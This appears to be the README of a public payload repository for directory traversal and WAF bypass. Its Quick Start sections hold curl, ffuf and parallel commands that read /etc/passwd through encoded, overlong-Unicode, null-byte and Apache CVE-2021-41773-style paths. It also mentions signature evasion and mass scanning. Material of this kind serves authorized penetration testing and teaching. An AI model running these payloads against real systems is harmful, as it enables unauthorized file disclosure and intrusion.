# ADVANCED-DIRECTORY-TRAVERSAL-PAYLOADS

Advanced WAF bypass, encoded payloads, and comprehensive directory traversal techniques for Linux and Windows systems.

## Overview

This repository contains a comprehensive collection of directory traversal payloads and WAF bypass techniques for authorized security testing, penetration testing, and educational purposes.

## Repository Contents

### 1. Directory_Traversal.txt
- **10,589+ basic payloads** for directory traversal attacks
- Targets common files: `/etc/passwd`, `/etc/shadow`, `/etc/group`
- Includes null byte injection variants
- Multiple depth traversal patterns

### 2. Advanced_WAF_Bypass_Payloads.txt
- **22 categories** of advanced WAF bypass techniques
- **2000+ advanced payloads** including:
  - URL encoding variations (single, double, triple)
  - Unicode and UTF-8 overlong encoding
  - Nested/recursive filter bypasses
  - Null byte injection techniques
  - Server-specific exploits (Nginx/Tomcat, IIS, ASP.NET)
  - Case variation and path separator mixing
  - UNC path injection for Windows
  - Protocol-based bypasses
  - Hybrid encoding combinations
  - Container and cloud-specific payloads

### 3. WAF_BYPASS_TECHNIQUES.md
- **Comprehensive documentation** of all techniques
- Detailed explanations of how each bypass works
- Real-world CVE examples
- Testing methodology and best practices
- Detection and prevention strategies
- Legal and ethical considerations
- Tools and resources for learning

### 4. Aggressive_Testing_Payloads.txt
- **30 sections** of real-world attack simulation payloads
- Polymorphic encoding to evade signature detection
- Time-based and race condition exploits
- HTTP parameter pollution and header injection
- Parser differential attacks
- Unicode normalization exploits
- Protocol smuggling patterns
- Real CVE exploitation patterns (Apache, Atlassian, Laravel)
- Zero-day simulation techniques
- Context-aware bypasses for WordPress, Drupal, Laravel, Django

### 5. AGGRESSIVE_TESTING_GUIDE.md
- **Complete penetration testing methodology**
- Pre-engagement authorization checklists
- Advanced reconnaissance techniques
- Exploitation strategies with code examples
- Automation using ffuf, Burp Suite, custom Python scripts
- WAF evasion techniques (timing, IP rotation, session persistence)
- Post-exploitation and attack chaining
- Real-world compromise scenarios
- Tool installation and configuration
- Professional reporting templates

## Usage

### For Security Professionals
- Penetration testing authorized systems
- Bug bounty hunting on in-scope targets
- Security research and vulnerability assessment
- Red team operations with proper authorization

### For Developers
- Understanding attack vectors
- Implementing proper input validation
- Testing application security controls
- Building robust WAF rules

### For Students
- Learning about web application security
- Understanding encoding and normalization
- Practicing in authorized lab environments (DVWA, WebGoat, HackTheBox)

## Quick Start

### Basic Testing
```bash
# Test basic traversal
curl "https://target.com/page?file=../../etc/passwd"

# Test URL encoded version
curl "https://target.com/page?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Test double encoded
curl "https://target.com/page?file=%252e%252e%252fetc%252fpasswd"
```

### Advanced Testing
```bash
# Server-specific bypass (Nginx/Tomcat)
curl "https://target.com/api/..;/..;/..;/etc/passwd"

# Unicode overlong UTF-8
curl "https://target.com/page?file=%c0%ae%c0%ae%c0%afetc%c0%afpasswd"

# Null byte injection
curl "https://target.com/page?file=../../etc/passwd%00.jpg"
```

### Aggressive Testing (Real Attack Simulation)
```bash
# Polymorphic encoding (evades signatures)
curl "https://target.com/api?file=%252e%252e%2f%c0%ae%c0%ae%2f..%2f%u002e%u002e%2fetc%2fpasswd"

# HTTP parameter pollution
curl "https://target.com/api?file=safe.txt&file=../../etc/passwd"

# Header injection bypass
curl "https://target.com/" -H "X-Original-URL: ../../etc/passwd"

# Race condition attack (use in script)
for i in {1..100}; do
  curl "https://target.com/api?file=../../etc/passwd" &
done

# CVE-2021-41773 (Apache 2.4.49) style
curl "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
```

### Automated Testing
```bash
# Using ffuf
ffuf -w Advanced_WAF_Bypass_Payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 -mr "root:"

# Using custom script
python3 advanced_fuzzer.py -u https://target.com/api -p file \
     -w Aggressive_Testing_Payloads.txt

# Mass parallel testing
cat payloads.txt | parallel -j 50 \
  'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'
```

## Key Techniques

### Most Effective by Platform

| Platform | Recommended Techniques |
|----------|----------------------|
| **IIS** | Unicode overlong encoding, UNC paths |
| **Nginx/Tomcat** | `..;/` path discrepancy bypass |
| **PHP < 5.3.4** | Null byte injection |
| **Windows** | Path separator mixing, case variation |
| **Java Apps** | Protocol handlers (jar:, url:, file:) |
| **Generic WAF** | Double/triple encoding, nested sequences |

### Encoding Techniques

1. **URL Encoding**: `%2e%2e%2f` (single), `%252e%252e%252f` (double)
2. **Unicode**: `%u002e%u002e%u2215` (UTF-16)
3. **Overlong UTF-8**: `%c0%ae%c0%ae%c0%af` (non-standard encoding)
4. **Hybrid**: Combination of multiple encoding methods

## Legal & Ethical Notice

⚠️ **IMPORTANT**: These payloads are provided for authorized security testing ONLY.

### Required Authorization
- Written permission from system owner
- Defined scope of testing
- Clear rules of engagement
- Proper documentation

### Authorized Use Cases
- Penetration testing engagements
- Bug bounty programs with explicit scope
- CTF competitions
- Educational lab environments
- Personal test systems

### Prohibited Activities
- Unauthorized access to systems
- Testing without explicit permission
- Destructive attacks or DoS
- Mass automated scanning of non-consenting targets
- Malicious exploitation

**Violation of these guidelines may result in criminal prosecution under CFAA (USA), Computer Misuse Act (UK), or equivalent laws in your jurisdiction.**

## Contributing

Contributions are welcome for:
- New bypass techniques
- Platform-specific payloads
- Documentation improvements
- Real-world case studies (responsibly disclosed)

Please ensure all contributions:
- Include proper documentation
- Cite sources where applicable
- Follow responsible disclosure practices
- Include no active exploits for unpatched vulnerabilities

## Resources

### Learning Materials
- [OWASP Path Traversal Guide](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Practice Labs
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP training application
- **HackTheBox** - Penetration testing labs
- **TryHackMe** - Security training platform

### Testing Tools
- **Burp Suite** - Web application testing
- **OWASP ZAP** - Security scanner
- **ffuf** - Fast web fuzzer
- **wfuzz** - Web application fuzzer

## Responsible Disclosure

If you discover a vulnerability using these techniques:

1. Document the issue thoroughly
2. Report to vendor/owner immediately
3. Allow reasonable time for patching (typically 90 days)
4. Coordinate public disclosure
5. Never weaponize or sell exploits

## License

This repository is provided for educational and research purposes. Use responsibly and ethically.

## Author

Maintained for the security research community.

## Disclaimer

The authors and contributors are not responsible for misuse of these payloads. Users are solely responsible for ensuring they have proper authorization before testing any systems.

---

**Stay Ethical. Stay Legal. Stay Curious.**
